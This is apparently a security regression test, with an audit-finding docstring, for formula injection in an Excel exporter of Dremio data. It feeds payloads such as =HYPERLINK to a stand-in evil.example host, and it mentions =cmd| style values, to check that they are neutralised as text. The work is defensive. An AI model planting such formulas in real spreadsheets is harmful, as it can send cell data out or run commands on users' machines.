"""
================================================================================
F-34 - Warehouse values run as Excel formulas on open        (High, CWE-1236)
================================================================================
A text cell beginning '=', '+', '-' or '@' is interpreted by a spreadsheet as a
FORMULA when the workbook is opened - CSV/formula injection. Dremio rows are
written by other users, so a value like =HYPERLINK("http://x"&A1) or =cmd|...
becomes a live formula on whoever opens the export. The exporter used to write
string cells verbatim, so the formula was live.

The contract chosen, and why
----------------------------
The same replace-and-say contract as F-05: each triggering cell is prefixed with
an apostrophe (Excel's text marker, hidden on display) so it stays text, and the
affected cells are named to the user in the log and a dialog. Numeric columns
hold real numbers and are left alone; only real string cells are quoted. This
matches the dremio_excel skill (finding A-01) so the two exporters behave
identically.

What is checked
---------------
That the export succeeds, that NO cell reads back as a live formula (openpyxl
data_type 'f'), that safe values and real numbers are untouched, that the user
is told, and that self.df is not mutated.
================================================================================
"""

REQUIRES_DISPLAY = True

import pandas as pd
from openpyxl import load_workbook

import harness as h

PAYLOADS = ["=1+1", '=HYPERLINK("http://evil.example")', "+1", "-2+3", "@SUM(A1)"]


def export_with_formula_values(tmp):
    h.step("The real export, over data a spreadsheet would run as formulas")

    frame = pd.DataFrame({
        "note": PAYLOADS + ["ordinary"],
        "amount": [1, 2, 3, 4, 5, 6],            # real numbers, must not be quoted
    })
    original = frame.copy(deep=True)

    path = tmp / "formulas.xlsx"
    state = {}
    with h.tk_app(output_dir=tmp, filename="formulas.xlsx", autofit=True) as app:
        app.df = frame
        try:
            app._export_to_excel()
            state["exported"] = True
            state["error"] = ""
        except Exception as e:
            state["exported"] = False
            state["error"] = f"{type(e).__name__}: {str(e)[:80]}"
        state["reported"] = list(getattr(app, "last_neutralised", []))

    state["df_unmutated"] = frame.equals(original)

    formulas, note_values, amounts = [], [], []
    if state["exported"] and path.exists():
        wb = load_workbook(path)
        ws = wb[wb.sheetnames[0]]
        for row in ws.iter_rows(min_row=2):
            note, amount = row[0], row[1]
            if note.data_type == "f" or (isinstance(note.value, str)
                                         and note.value.startswith("=")):
                formulas.append(note.value)
            note_values.append(note.value)
            amounts.append(amount.value)
    state["formulas"] = formulas
    state["note_values"] = note_values
    state["amounts"] = amounts

    h.table(["check", "result"], [
        ["export completed", str(state["exported"])
         + (f" ({state['error']})" if state["error"] else "")],
        ["live formulas in workbook", repr(formulas) if formulas else "none"],
        ["note column read back", repr(note_values)],
        ["amount column read back", repr(amounts)],
        ["cells reported to the user", str(len(state["reported"]))],
        ["self.df left unmutated", str(state["df_unmutated"])],
    ])
    return state


def main():
    h.require_display()
    h.banner("F-34", "Formula injection through exported cell values")

    with h.isolated_home(), h.temp_dir() as tmp:
        state = export_with_formula_values(tmp)

    no_live_formulas = state["exported"] and not state["formulas"]
    # The five triggering values must all still be present, just quoted.
    quoted = sum(1 for v in state["note_values"]
                 if isinstance(v, str) and v.startswith("'"))
    safe_intact = "ordinary" in state["note_values"]
    numbers_intact = state["amounts"] == [1, 2, 3, 4, 5, 6]
    reported = len(state["reported"]) >= len(PAYLOADS)

    h.step("Contract check")
    h.detail("export completed", state["exported"])
    h.detail("live formulas remaining", state["formulas"] or "none")
    h.detail("triggering cells quoted as text", quoted)
    h.detail("safe value intact", safe_intact)
    h.detail("numeric column untouched", numbers_intact)
    h.detail("affected cells reported to the user", len(state["reported"]))
    h.detail("self.df left unmutated", state["df_unmutated"])

    if (no_live_formulas and quoted >= len(PAYLOADS) and safe_intact
            and numbers_intact and reported and state["df_unmutated"]):
        h.verdict("F-34", h.NOT_REPRODUCIBLE,
                  f"no exported cell reads back as a live formula: the "
                  f"{quoted} value(s) that began with = + - @ were prefixed "
                  f"with an apostrophe so Excel stores them as text, real "
                  f"numbers and safe strings are untouched, and the affected "
                  f"cells are named to the user rather than changed silently. "
                  f"self.df itself is not mutated")
    elif not state["exported"]:
        h.verdict("F-34", h.CONFIRMED,
                  f"the export failed: {state['error']}")
    else:
        h.verdict("F-34", h.CONFIRMED,
                  f"exported, but the contract is not met: "
                  f"live_formulas={state['formulas']} quoted={quoted} "
                  f"safe_intact={safe_intact} numbers_intact={numbers_intact} "
                  f"reported={reported} df_unmutated={state['df_unmutated']}")


if __name__ == "__main__":
    main()
